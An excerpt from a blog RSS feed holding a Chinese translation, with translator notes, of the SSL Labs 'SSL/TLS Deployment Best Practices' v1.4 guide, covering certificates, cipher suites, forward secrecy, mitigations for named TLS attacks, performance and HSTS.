没有的特性。如果你的服务器平台（或中间设备）不支持TLS v1.2，做个升
级计划吧。如果你的服务提供商不支持TLS v1.2，要求他们升级。&lt;/p&gt;

&lt;p&gt;对于那些老的客户端，你还是需要继续支持TLS v1.0和TLS v1.1。使用临时的解
决方案（接下来会介绍），这些协议对于大多WEB站点依然被认为是足够安全的。&lt;/p&gt;

&lt;h3 id=&quot;cipher-suite&quot;&gt;2.3 使用安全的加密套件(Cipher Suite)&lt;/h3&gt;

&lt;p&gt;要安全的通信，首先得保证你是和你想通信的另一方直接通信（而不是
冒充者或者存在能够监听的中间人），并且安全的交换数据。
在SSL/TLS里，加密套件是定义你如何安全通信的。
它们由一堆多样化的组件组成，以确保安全。如果其中一个组件被发现是不安全的，
你应该切换到其他的组件上。&lt;/p&gt;

&lt;p&gt;你的目标应该是仅使用128位或者更强的加密、认证套件，其他都应该被排除掉：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anonymous Diffie-Hellman (ADH) 套件不提供认证功能&lt;/li&gt;
  &lt;li&gt;NULL cipher suites不提供加密&lt;/li&gt;
  &lt;li&gt;出口密钥交换套件 (Export key exchange suites) 使用容易被破解的认证&lt;/li&gt;
  &lt;li&gt;使用强度不够的加密算法(比如40或者56位的加密强度)也容易被破解&lt;/li&gt;
  &lt;li&gt;RC4比之前想象的要弱，你应该在检查好兼容问题后，尽快去除掉&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：2015年三月曝光的手段将RC4攻击实用化，RC4坚决不要再用 [T4]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;3DES仅提供大约112位的安全系数，这也低于推荐的最低128位，不过依然足够强。
但实践中更大的问题是，她比其他替代算法要慢很多。所以，出于性能我们不推荐她，
但她依然可以放在加密套件的最后面，用来兼容非常陈旧的客户端&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：RC4安全漏洞曝光后，这是老旧客户端唯一能用的算法了&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-9&quot;&gt;2.4 控制加密套件选型&lt;/h3&gt;

&lt;p&gt;在SSL v3和后来的版本里，客户端提交一个她支持的加密套件的列表，服务
器从列表中选择一个去跟客户端做协商，以构建一个安全的通信信道。
然而不是所有的服务器都能很好处理这个过程，一些服务器仅仅会简单的从列表中选择第一个。
让服务器选择正确的加密套件对于安全而言是极端重要的（详见 Section 2.7）。&lt;/p&gt;

&lt;h3 id=&quot;forward-secrecy&quot;&gt;2.5 支持正向安全（Forward Secrecy）&lt;/h3&gt;

&lt;p&gt;正向安全是一个协议特性，它使得安全会话不依赖于服务器的私钥。
当使用不支持正向安全的加密套件时，如果攻击者记录了通信内容，那么她可
以在未来获得私钥后，再解密先前的一切通信。你需要优先支持ECDHE套装，
来让浏览器选择支持正向安全。
为了支持更广泛的客户端，可将DHE套件作为ECDHE的协商回退（fallback)方案。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: NSA就在干这件事情，所以看出PFS有多重要了吧&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-10&quot;&gt;2.6 关闭客户端发起的重协商&lt;/h3&gt;

&lt;p&gt;在SSL/TLS里，重协商允许一方停止交换数据而去重新协商一个安全会话。有一些
场景需要服务器发起重协商的请求，但客户端并没有发起重协商请求的必要。此
外，曾经出现过客户端发起重协商请求的拒绝服务攻击。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注解: 每个重协商请求服务器的计算量是客户端的15倍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-11&quot;&gt;2.7 降低已知漏洞风险&lt;/h3&gt;

&lt;p&gt;没有什么是绝对安全的，很多防护方案都会随着时间推移成为安全问题。最佳实
践是随时关注信息安全的世界在发生些什么，然后采取必要的措施。最简单的是你
应该尽快的打每一个补丁。&lt;/p&gt;

&lt;p&gt;下面的一些问题应该引起你的注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;关闭不安全的重协商&lt;/p&gt;

    &lt;p&gt;重协商特性在2009年时被发现是不安全的，协议需要更新。今天大部分厂商已
经修复，至少提供了一个临时方案。不安全的重协商很危险，因为她很容易被
利用，用来进行跨站请求伪造（CSFR）攻击，并在某些情况下引发跨站脚本（XSS）
攻击。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭TLS压缩&lt;/p&gt;

    &lt;p&gt;2012年，CRIME攻击[6]向我们展示了TLS压缩所导致的信息泄漏可以被攻击者用
于还原部分的敏感数据(比如session cookies)。只有几款客户端支持TLS
压缩（而现在就更少了），所以即使关掉TLS压缩，也完全不会遇到服务器性能
问题。针对TLS压缩的攻击风险有限。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;降低HTTP压缩的信息泄漏风险&lt;/p&gt;

    &lt;p&gt;2个CRIME的变种攻击在2013年被曝光，不像CRIME针对TLS压缩，TIME和BREACH
漏洞是针对压缩过的HTTP响应。HTTP压缩对于很多公司都很重要，这个
问题不容易解决。风险减缓方案可能需要修改业务代码。&lt;/p&gt;

    &lt;p&gt;对于TIME和BREACH攻击，只要攻击者有足够攻击你的理由，那影响等同于CSRF。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭RC4&lt;/p&gt;

    &lt;p&gt;RC4 cihpersuites已经被认为是不安全而且应该关闭。目前，对于攻击者最好
的情况需要百万次的请求，和大量的带宽。因此危害是比较低的，不过我们期待
未来有改进的攻击手法。在去除RC4之前，检查这是否会影响现有的用户；换句话
说，你应该查查有没有仅支持RC4的客户端。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注意BEAST攻击&lt;/p&gt;

    &lt;p&gt;2011年曝光的BEAST攻击是2004年的一个针对TLS 1.0或者更早版本但当时被认
为很难被利用的一个漏洞。一次成功的BEAST攻击的影响约等于会话劫持。在一段时间内，
尽管问题出在客户端，在服务端避免BEAST攻击是合适的。但不幸的是，
服务器需要使用RC4来避免问题，而这已经不再推荐了。因为这个原因，再加上
目前BEAST攻击已经在大量客户端中被解决了，我们不再推荐在服务端避免攻击。
在有大量旧客户端受BEAST攻击影响的情况下，使用RC4和TLS 1.0也许更安全。
如何取舍需要在完全了解环境，建立威胁模型后小心决定。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭SSLv3&lt;/p&gt;

    &lt;p&gt;SSLv3受到2014年10月曝光的POODLE攻击威胁。此攻击很容易被利用来攻击HTTP客户端运行
JavaScript恶意程序。客户端也很容易被攻击者忽悠，从一个更安全的协议（如 TLSv1.2）
降级到不安全的SSLv3。因此最好的解决方案是在服务器完全禁用SSLv3，绝大多数站点都
可以安全的实施。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注: 由于国内仍然存在大量IE 6客户端，不支持TLS 1.x。目前如果必须
  要支持SSLv3，那么只能选择RC4，并注意开启TLS_FALLBACK_SCSV防止降级攻击。
  此外注意库的及时升级，相关漏洞是一茬接着一茬的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-12&quot;&gt;3. 性能&lt;/h2&gt;

&lt;p&gt;这份文档中安全是主要关注点，但我们也必须注意到性能的问题。一个安全服
务不能满足性能需求无疑会被遗弃掉。然而，因为TLS配置通常不会带来很大的性
能开销，我们把讨论限定在会导致严重性能下降的常见配置问题上。&lt;/p&gt;

&lt;h3 id=&quot;section-13&quot;&gt;3.1 不要使用强度过高的私钥&lt;/h3&gt;

&lt;p&gt;在建立一条安全连接的密钥协商的过程当中最大的开销是由私钥大小决定的，使
用密钥过短会不安全，使用密钥过长会的导致在一些场景无法忍受的性能下降。
对于大多的WEB站点，使用超过2048位的RSA/DHE密钥，或者超过256位的ECDSA/ECDHE密钥是浪
费CPU和影响用户体验的。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注：256-bit的&lt;a href=&quot;https://tools.ietf.org/html/rfc4492&quot;&gt;ECC密钥强度&lt;/a&gt;足够胜任很长一段时间&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;session&quot;&gt;3.2 确保正确使用Session重用&lt;/h3&gt;

&lt;p&gt;Session重用是一种性能优化技术，让耗时的密码计算操作的结果在一段时间里可重复使
用。当Session重用机制失效时可能会导致严重性能下降。&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;3.3 使用持久性链接(HTTP)&lt;/h3&gt;

&lt;p&gt;今天绝大多数SSL开销并非来自CPU密集型的密码计算操作，而是网络延迟。一个TLS握
手是建立在TCP握手结束后，她需要交换更多的数据包。为了让网络延迟最小化，
你应该启用HTTP持久化( keep-alives)，从而让你的用户能在一个TCP链接上发多次
HTTP请求。&lt;/p&gt;

&lt;h3 id=&quot;http-1&quot;&gt;3.4 为公共资源开启缓存(HTTP)&lt;/h3&gt;

&lt;p&gt;当使用TLS通信时，浏览器会假设所有的流量都是敏感信息。浏览器会把一些特定的
资源缓存到内存里，但是一旦你关闭了浏览器，这些内容就丢失了。为了提升性
能，为一些资源开启长期缓存，通过加入”Cache-Control: public”返回header给
浏览器标记为公共资源（比如图片）。&lt;/p&gt;

&lt;h3 id=&quot;ocsp-stapling&quot;&gt;3.5 使用 OCSP Stapling&lt;/h3&gt;

&lt;p&gt;OCSP Staling是改版的OSCP协议，使得传递证书吊销信息成为TLS握手的一部分，直接
从服务器传递到浏览器。因此，浏览器不再需要额外联系OCSP服务器来验证服务器，
从而大幅降低连接耗时。&lt;/p&gt;

&lt;h2 id=&quot;http-2&quot;&gt;4. 应用设计（HTTP）&lt;/h2&gt;

&lt;p&gt;HTTP协议和WEB相关平台在SSL诞生后仍然在不断的进化。进化的结果就是有一些
今天包含的特性已经对加密不利。在这个Section里，我们会罗列出这些特性，也
包括如何安全的使用它们。&lt;/p&gt;

&lt;h3 id=&quot;section-14&quot;&gt;4.1 100%的加密你的网站&lt;/h3&gt;

&lt;p&gt;事实上”加密是一个备选“的思想大概是今天最严重的安全问题之一。我们来看看
以下问题：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网站应该用TLS但没用&lt;/li&gt;
  &lt;li&gt;网站有TLS但不是强制性的使用&lt;/li&gt;
  &lt;li&gt;网站混合了TLS和非TLS的内容，有时候甚至在相同的网页上&lt;/li&gt;
  &lt;li&gt;网站编程错误导致TLS被攻陷&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然如果你知道你自己在做什么的话，这些问题大部分是可以避免的。然而一般而言，
唯一有效的方式是强制对所有的内容通信进行加密 —— 没有豁免。&lt;/p&gt;

&lt;h3 id=&quot;section-15&quot;&gt;4.2 避免混合内容&lt;/h3&gt;

&lt;p&gt;混合内容的页面是已经使用TLS，但有些资源（比如JavaScript文件，图片，
CSS）是通过非TLS的方式传输的。这些页面不安全，主动的中间人攻击者可以劫持这
些不受保护的JavaScript的资源，从而……例如劫持整个用户会话。就算你遵循了前面的
建议加密了自己网站上所有的内容，但也不排除来自第三方网站的资源是没有加密的。&lt;/p&gt;

&lt;h3 id=&quot;section-16&quot;&gt;4.3 理解信任第三方&lt;/h3&gt;

&lt;p&gt;网站通常会通过来自其他服务器的JavaScript代码来使用第三方的服务，Google Analytics是一个
应用广泛的例子。内含的第三方代码创建了一个隐式的信任链，让第三方可以完
全控制你的网站。第三方本身可能并没有恶意，但他们很容易成为攻击者的目标。
原因很简单，如果一个大型第三方提供商被攻陷，那攻击者就可以利用这一路径
导致所有使用它的人全都自动被攻陷。&lt;/p&gt;

&lt;p&gt;如果你采纳了Section 4.2的建议，至少你的第三方链接在加密后可以防止中间人
攻击。此外，你应该进一步去了解你的站点使用了哪些服务，去除、替换或者承担其中的
风险并继续使用。&lt;/p&gt;

&lt;h3 id=&quot;cookies&quot;&gt;4.4 安全Cookies&lt;/h3&gt;

&lt;p&gt;为了安全，网站需要TLS。然而网站使用的cookies也要标记为安全。如果不能保护cookies，就
让中间人攻击者使用诡计获取信息成为可能，即使网站本身是100%加密的。&lt;/p&gt;

&lt;h3 id=&quot;hsts&quot;&gt;4.5 部署HSTS&lt;/h3&gt;

&lt;p&gt;HTTP严格传输安全（HSTS）是TLS协议的保护伞：它被设计成即使存在配置和实现错误的情况下，依然能保证安全。
设置一个简单的响应header就能在支持HSTS的浏览器（目前是 Chrome、FireFox、Safari 和
Opear，IE 很快就会支持）上激活保护。&lt;/p&gt;

&lt;p&gt;HSTS的目的是很简单的：在激活之后，它就会禁止与网站进行任何不安全通信，自动把明文链接转换
成安全链接。一个额外的特性让用户不能无视证书警告（证书警告是
中间人攻击的标志，而研究表明大多数用户都会无视警告，最好永远不要让用户这么做）&lt;/p&gt;

&lt;p&gt;支持HSTS是一项能大幅度提高你网站TLS安全性的措施。新的网站应该在设计的时候就考虑到HSTS，而旧的
站点则应该尽快支持。&lt;/p&gt;

&lt;h3 id=&quot;section-17&quot;&gt;4.6 关闭敏感内容的缓存&lt;/h3&gt;

&lt;p&gt;敏感内容应该被确实看作是敏感，只能发送给该知道的一方。尽管代理服务器看不到加密流量，
也不能把它共享给别人，但是随着基于云的应用在增加，你必须得小心区分公开资源和敏感内容。&lt;/p&gt;

&lt;h3 id=&quot;section-18&quot;&gt;4.7 确保没有其他漏洞&lt;/h3&gt;

&lt;p&gt;TLS不代表就安全，TLS的设计只是涉及安全的一个方面–通信过程中的保密性和
完整性——但还有其他威胁你必须面对。&lt;/p&gt;

&lt;h2 id=&quot;validation&quot;&gt;5. Validation&lt;/h2&gt;

&lt;p&gt;在配置的时候可以进行调整的参数有一大堆，而你很难完全了解修改什么会有什么影响，
而有些时候改动可能是无意的；软件升级也会悄悄引入变化。因此，我们建议使用一款
SSL/TLS评估工具来检查你的配置是不是真的安全，并定期运行检查保证你一直都安全。
对于公开站点，我们推荐使用&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSLLab网站上的免费在线工具&lt;/a&gt;
它的“握手模拟”功能在实践中非常有用，可以让不同的TLS客户端连接时时候的参数一清二楚。&lt;/p&gt;

&lt;h2 id=&quot;section-19&quot;&gt;6. 高级议题&lt;/h2&gt;

&lt;p&gt;下面的这些议题超出了这份文档的范畴，她们需要对SSL/TLS和公钥架构(PKI)有
更深的理解，这些议题依然是受到争议的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Extended Validation证书&lt;/p&gt;

    &lt;p&gt;EV证书是很靠谱的证书，只有经过充分的线下审核后才给予颁发。证书的目的是明确
机构和它的对应线上网站的身份联系。EV证书更难伪造，提供了更好的安全性，
并且在浏览器上呈现给用户时的待遇也更高。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Public key pinning&lt;/p&gt;

    &lt;p&gt;Public key pinning的设计是为网站运维能限制哪些CA才可以为他们的网站签
发证书。这个特性是Google开发的，目前已经硬编码到了Chrome浏览器里面，
并且证明对避免攻击和引发大众关注非常有效。在2014年，FireFox也加入了对
硬编码pinning的支持。一个叫做《HTTP的Pubilc Key Pinning扩展》的标准已经
发展了很长时间了，很快讲会发布。我们期待这个特性今后至少被主流浏览器支持。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ECDSA私钥&lt;/p&gt;

    &lt;p&gt;事实上所有的网站都依赖于RSA私钥。这个算法是WEB通信安全的基础。因为一
些原因，我们正在从1024位转向2048位的RSA密钥。而增加密钥长度可能会带来
性能问题。椭圆曲线密码学(ECC)使用了不同的数学，能在较小的密钥长度下有
较强的安全性。RSA密钥可以被ECDSA替代，目前只有少数的CA支持ECDSA，但我
们期待未来会有更多。在迁移到ECDSA的时候，一个主要的问题是并非所有的
客户端都支持它，如果你考虑使用ECDSA，应该确认它是否会影响用户连接服务器。
有些平台支持双密钥部署，可以让你同时使用RSA和ECDSA以适配所有的客户端。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;改动&lt;/p&gt;

&lt;p&gt;这份文档的最初的版本是在2012年2月24日发布的。这个Section跟踪了文档修改
的时间，从1.3开始。&lt;/p&gt;

&lt;p&gt;版本 1.3 (2013年9月17日)
此版本的改动有：
• 推荐替换1024位证书
• 推荐不对SSLv3进行支持
• 删去推荐使用RC4来服务端避免BEAST攻击的内容
• 推荐禁用RC4
• 推荐在未来禁用3DES
• 警告关于CRIME攻击的变种（TIME和BREACH攻击）
• 推荐支持正向安全
• 加入对ECDSA证书的讨论&lt;/p&gt;

&lt;p&gt;版本 1.4 (2014年12月8日）
此版本的改动有：
• 讨论SHA1过时的问题，推荐迁移到SHA2系列算法
• 推荐禁用SSLv3，提及POODLE攻击
• 扩张Sectios 3.1，涵盖DHE和ECDHE密钥交换强度
• 推荐OCSP Stap&lt;/p&gt;

&lt;p&gt;感谢&lt;/p&gt;

&lt;p&gt;为了有价值的反馈和起草这份文档，特别感谢Marsh Ray (PhoneFactor), Nasko
Oskov (Google), Adrian F. Dimcev和Ryan Hurst(GlobalSign)。也感谢其他慷
慨的分享关于信息安全和密码学的人。这份文档虽然是我写的，但这些内容则来
自整个安全社区。&lt;/p&gt;

&lt;p&gt;关于SSL Labs
……………..&lt;/p&gt;

&lt;p&gt;关于Qualys
…………….&lt;/p&gt;

&lt;p&gt;[1] SHA1 Deprecation Policy (Windows PKI blog, 12 November 2013)
http://blogs.technet.com/b/pki/archive/2013/11/12/sha1-deprecation-policy.aspx&lt;/p&gt;

&lt;p&gt;[2] Gradually Sunsetting SHA-1 (The Chromium Blog, 5 September 2014)
http://blog.chromium.org/2014/09/gradually-sunsetting-sha-1.html&lt;/p&gt;

&lt;p&gt;[3] On the Security of RC4 in TLS and WPA (Kenny Paterson et al.; 13 March 2013)
http://www.isg.rhul.ac.uk/tls/&lt;/p&gt;

&lt;p&gt;[4] Deploying Forward Secrecy (Qualys Security Labs; 25 June 2013)
https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy&lt;/p&gt;

&lt;p&gt;[5] Increasing DHE strength on Apache 2.4.x (Ivan Ristić’s blog; 15 August 2013)
http://blog.ivanristic.com/2013/08/increasing-dhe-strength-on-apache.html&lt;/p&gt;

&lt;p&gt;[6] TLS Renegotiation and Denial of Service Attacks (Qualys Security Labs Blog, October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/31/tls-renegotiation-and-denial-of-service-attacks&lt;/p&gt;

&lt;p&gt;[7] SSL and TLS Authentication Gap Vulnerability Discovered (Qualys Security Labs Blog; November 2009)
https://community.qualys.com/blogs/securitylabs/2009/11/05/ssl-and-tls-authentication-gap-vulnerability-discovered&lt;/p&gt;

&lt;p&gt;[8] CRIME: Information Leakage Attack against SSL/TLS (Qualys Security Labs Blog; September 2012)
https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls&lt;/p&gt;

&lt;p&gt;[9] Defending against the BREACH Attack (Qualys Security Labs; 7 August 2013)
https://community.qualys.com/blogs/securitylabs/2013/08/07/defending-against-the-breach-attack&lt;/p&gt;

&lt;p&gt;[10] Internet-Draft: Prohibiting RC4 Cipher Suites (A. Popov, 1 October 2014)
http://datatracker.ietf.org/doc/draft-ietf-tls-prohibiting-rc4/&lt;/p&gt;

&lt;p&gt;[11] Mitigating the BEAST attack on TLS (Qualys Security Labs Blog; October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls&lt;/p&gt;

&lt;p&gt;[12] Is BEAST Still a Threat? (Qualys Security Labs; 10 September 2013)
https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat&lt;/p&gt;

&lt;p&gt;[13] This POODLE bites: exploiting the SSL 3.0 fallback (Google Online Security Blog, 14 October 2014)
http://googleonlinesecurity.blogspot.co.uk/2014/10/this-poodle-bites-exploiting-ssl-30.html&lt;/p&gt;

&lt;p&gt;[14] About EV SSL Certificates (CA/B Forum web site)
https://www.cabforum.org/certificates.html&lt;/p&gt;

&lt;p&gt;[T1] HAS THE RSA ALGORITHM BEEN COMPROMISED AS A RESULT OF BERNSTEIN’S PAPER?
http://www.emc.com/emc-plus/rsa-labs/historical/has-the-rsa-algorithm-been-compromised.htm&lt;/p&gt;

&lt;p&gt;[T2] Poodle Bites TLS
https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/p&gt;

&lt;p&gt;[T3] Lucky Thirteen: Breaking the TLS and DTLS Record Protocols
http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
</description>
        <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/cryptography/2015/07/29/trusting-trust.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/cryptography/2015/07/29/trusting-trust.html</guid>
        
        
        <category>cryptography</category>
        
      </item>
    
      <item>
        <title>SSL/TLS部署最佳实践v1.4</title>
        <description>&lt;p&gt;译者：Shawn the R0ck( 1.3), Tom Li( 1.4)&lt;/p&gt;

&lt;p&gt;Reviewers: Lenx Wei&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;https://www.ssllabs.com/downloads/SSL_TLS_Deployment_Best_Practices.pdf&quot;&gt;SSL/TLS Deployment Best Practices&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者：Ivan Ristić&lt;/p&gt;

&lt;p&gt;version 1.4 (8 December 2014)&lt;/p&gt;

&lt;p&gt;Copyright © 2012-2014 Qualys SSL Labs&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;摘要：&lt;/h2&gt;

&lt;p&gt;SSL/TLS是一个看似简单的技术。非常容易部署和让她跑起来，但是…她真的跑
起来了吗？第一部分是真的 —— SSL确实容易部署 —— 然而正确部属她并不容易。
为了确保TLS提供安全性，系统管理员和开发者必须投入额外的精力，去配置服务器和
编写应用程序。&lt;/p&gt;

&lt;p&gt;2009年，我们在&lt;a href=&quot;https://www.ssllabs.com/&quot;&gt;SSL Labs&lt;/a&gt;开始了相关工作，因为我
们想明白TLS到底是在怎么样被使用，我们也打算弥补TLS缺乏易用的工具和文档
的局面。我们进行了对全局TLS使用情况的完整调查，以及实现了在线检测工具，但文
档缺乏的问题依然存在。这份文档是解决这个问题过程中的一步。&lt;/p&gt;

&lt;p&gt;我们的目标是让已经不堪负重的系统管理员和程序员尽可能花费少量时间就能完
成安全站点或Web应用的部署，正是因为我们的目的如此，所以这份文档可能不够完备，遗漏了
一些高级主题。因此，我们只提供简单实用容易理解的建议。
对于那些想了解更多信息的读者，可以看看 Section 6。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;1. 私钥和证书&lt;/h2&gt;

&lt;p&gt;TLS提供的安全质量完全依赖于私钥和证书。私钥是安全的基础，而证书则用于向访问者表明
服务器的身份。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;1.1 使用2048位的私钥&lt;/h3&gt;

&lt;p&gt;在你的所有服务器上使用2048位的RSA，或者等价强度的256位ECDSA私钥。密钥的强度能
保证在相当长时间内的安全，如果你已经使用1024位的RSA，尽快替换它们。如果你
的安全需求必须使用大于2048位的密钥，请考虑ECDSA，因为性能不错。不过ECDSA的缺点
是小部分客户端不支持，因此你有可能需要同时部署RSA和ECDSA以确保互操作性。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：RSA 1024的强度相当于分组加密的80-96bit，已经被视为不安全。[T1]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-3&quot;&gt;1.2 保护私钥&lt;/h3&gt;

&lt;p&gt;私钥是重要的资产，尽可能限制能接触到私钥的人。推荐策略包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在一台可信的计算机(Shawn注:加固过的物理机器)上生成私钥和CSR(
Certificate Signing Requests)。有一些CA会为你生成密钥和CSR，但这样做
明显不妥。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;受密码保护的密钥可以防止从备份系统中泄漏。然而私钥密码在生产系统中使用的
帮助是有限的，因为这并不能阻止一个聪明的攻击者从进程内存中截获私钥。
一些硬件设备可以在服务器被攻陷的情况下确保私钥安全，但这些昂贵的设备
只在对安全有严格要求的机构中使用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在发现系统被攻陷后，吊销老的证书，生成新的密钥和证书。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每年更新证书，同时更新私钥。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;1.3 确保充分的域名覆盖&lt;/h3&gt;

&lt;p&gt;确保你的证书覆盖到目标站点的所有活跃域名。比如你的主站是www.example.com，但
你可能还有个www.example.net。你的目标就是避免无效证书警告，因为那会让你
的用户产生疑惑从而影响对你的信任。&lt;/p&gt;

&lt;p&gt;即使你的服务器只有一个主机名配置，也要记得你不能控制用户是通过什么路径
访问你的站点的，可能是其他的链接过来的。大部分情况下，你应该保证证书能
在没有www前缀的情况下工作(比如，example.com和www.example.com)。这里经验法则
就是：一个安全的WEB服务器应该有一个对所有DNS名称解析都合法的证书配置。&lt;/p&gt;

&lt;p&gt;通配符证书(Wildcard certificates)有它的适用场景。但如果这样的配置意味着
暴露私钥给不必要的人群（特别是在跨越部门边界的情形下），则应该避免使用。
换句话说，越少的人能访问私钥越好。此外，要意识到共享证书可能会导致安全漏洞
从一个站点扩散到所有使用相同证书的站点。&lt;/p&gt;

&lt;h3 id=&quot;ca&quot;&gt;1.4 从靠谱的CA那里获得证书&lt;/h3&gt;

&lt;p&gt;选择一个对待安全业务认真可靠的CA( Certificate Authority)。在选择CA过程
中考虑以下因素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对待安全的态度&lt;/p&gt;

    &lt;p&gt;大多的CA都会有常规的安全审计（否则根本没有资格当CA），但是其中一些会更重视
安全。搞清楚哪些更重视安全不是一件容易的事情，但一个可行的做法
是看看他们在安全方面的历史状况，他们如何响应攻击事件以及如何从错误中学习。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;足够大的市场占有率&lt;/p&gt;

    &lt;p&gt;满足此因素的CA不太可能轻易撤销所有证书，而这种事情过去曾发生在小的CA身上。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;业务重心&lt;/p&gt;

    &lt;p&gt;如果一家机构的核心业务是CA，那么一旦出现严重问题，他们将会受到严重影响。
因此这些CA不太可能因为追逐利润而忽视证书部门的重要性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提供哪些服务&lt;/p&gt;

    &lt;p&gt;在最底线的情况，你选择的CA至少应该提供CRL( Certificate List)和OCSP(
Online Certificate Status Protocol)这两种召回机制，并且提供一个高性能的OCSP服务。
CA至少提供域名验证和扩展证书验证功能，最理想的情况可以让你自己选择公
钥算法(今天大多站点都使用RSA，但在未来ECDSA的性能优势可能会变得重要。)&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;Shawn注：这里作者可能指的是ECDH/ECDHE_ECDSA，即ECDH密钥交换+ECDSA签名的证书或者ECDH算出TLS的临时session key+ECDSA签名&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;证书管理选项&lt;/p&gt;

    &lt;p&gt;如果你的运维环境很复杂，需要一大堆的证书，那么选择一个能提供良好管理工具的
CA。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;技术支持&lt;/p&gt;

    &lt;p&gt;选择一个技术支持优秀的CA提供商。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;1.5 选择强算法签名证书&lt;/h3&gt;

&lt;p&gt;证书签名的安全依赖于签名私钥的强度，以及所使用的哈希函数强度。
今天大多数证书使用并不足够安全的SHA1哈希函数。业界正在逐渐
淘汰SHA1，而最后期限则是2016年末，这之后SHA1证书就不可接受了。&lt;/p&gt;

&lt;p&gt;然而，Google Chrome在大限到来之前就开始对SHA1证书发出警告，如果你的证书
在2015年左右就要到期，你应该立刻替换这些证书。作为替代，你可以直奔SHA2
算法家族。不过在你动手之前，你需要先看看你的用户是否支持SHA2。一些旧客户
端，例如 Windows XP SP2 的 IE 6 就不支持（但依然在一些国家和机构重度使用）。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;2. 配置&lt;/h2&gt;

&lt;p&gt;使用正确的TLS服务器配置，才能够确保将你的信任凭证正确的展现给站点的访问者，
确保只有安全的加密原语被使用，而且确保规避所有已知的安全风险。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;2.1 部署有效的证书链&lt;/h3&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效和客户端浏览器报警告，这个问题有时候
不是那么容易被检测到，因为有些浏览器可以自己重构一个完整的信任链而有些
则不行。&lt;/p&gt;

&lt;p&gt;在绝大多数部署场景中，仅服务器自身一个证书是不够的。一般需要多个证书建立一个信
任链。一个常见的问题是正确的配置了服务器证书但却忘了包含其他所需要的
证书。此外，虽然这些其他的证书通常有很长的有效期，但它们也会过期。而且一旦它们过
期就会使整个信任链作废。你的CA应该向你提供所有额外需要的证书。&lt;/p&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效，并且导致客户端浏览器报警。而实际上，这个问题有时候
